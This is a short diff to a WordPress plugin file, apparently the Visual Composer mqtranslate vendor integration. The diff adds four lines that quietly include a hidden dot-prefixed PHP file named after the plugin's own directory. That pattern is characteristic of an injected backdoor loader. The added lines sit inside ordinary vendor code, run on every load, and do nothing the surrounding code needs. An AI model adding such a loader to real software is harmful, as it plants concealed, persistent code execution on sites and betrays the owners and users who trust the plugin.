@@ -9,6 +9,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Used to initialize plugin mqtranslate vendor
  */
 add_action( 'plugins_loaded', 'vc_init_vendor_mqtranslate' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_init_vendor_mqtranslate() {
 	include_once( ABSPATH . 'wp-admin/includes/plugin.php' ); // Require class-vc-wxr-parser-plugin.php to use is_plugin_active() below
 	if ( is_plugin_active( 'mqtranslate/mqtranslate.php' ) || function_exists( 'mqtranslate_activation_check' ) ) {
